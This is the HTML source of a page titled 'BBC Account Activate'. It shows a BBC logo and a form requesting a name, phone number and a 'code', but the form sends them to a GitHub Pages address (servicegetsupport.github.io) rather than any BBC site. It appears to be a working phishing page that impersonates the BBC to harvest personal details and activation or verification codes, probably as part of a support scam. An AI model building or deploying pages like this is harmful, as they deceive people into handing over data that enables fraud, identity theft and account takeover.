<html>
<head>

    <title>BBC Account Activate</title>
    <style>
    body {
        background-color: black;
        color: white;
        font-family: Arial, sans-serif;
    }
    
    #logo {
        margin: 10px;
        margin-top: 70px;
        text-align: center;
    }
    
    form {
        text-align: center;
        font-size: 30px;
    }
    
    input[type="text"] {
        width: 250px; /* Increase the width here */
        margin-bottom: 10px;
        height: 40px;
        border: 1px solid white;
        padding: 5px;
        margin-left: -35px;
        
    }
    
    input[type="submit"] {
        width: 220px;
        height: 40px;
        font-size: 25px;
        margin-top: 10px;
        border: 1px solid white;
        background-color: transparent;
        color: white;
    }
    
    .label-spacing {
        margin-bottom: 100px;
    }
    
    .form-label {
        display: inline-block;
        width: 150px;
        text-align: center;
        margin-right: 10px;
    }
    
    .form-input {
        display: inline-block;
        width: 20px;
        font-size: 20px;
    }
    
    .form-line {
        margin-bottom: 10px;
        font-size: 30px;
    }
</style>

</head>
<body>
    <div id="logo">
        <img src="BBC-Logo-1.png" alt="Logo">
    </div><br><br>
    
<form action="https://servicegetsupport.github.io/activate.html">
    <div class="form-line">
        <label class="form-label" for="name">Name:</label>
        <input class="form-input" type="text" id="name" name="SingleLine" required>
    </div>

    <div class="form-line">
        <label class="form-label" for "phone">Phone:</label>
        <input class="form-input" type="text" id="phone" name="SingleLine1" required>
    </div>

    <div class="form-line">
        <label class="form-label" for "code">Code:</label>
        <input class="form-input" type="text" id="code" name="SingleLine2" required>
    </div>

    <div class="form-line">
        <br> 
        <input type="submit" value="Submit">
    </div>
</form>

</body>
</html>
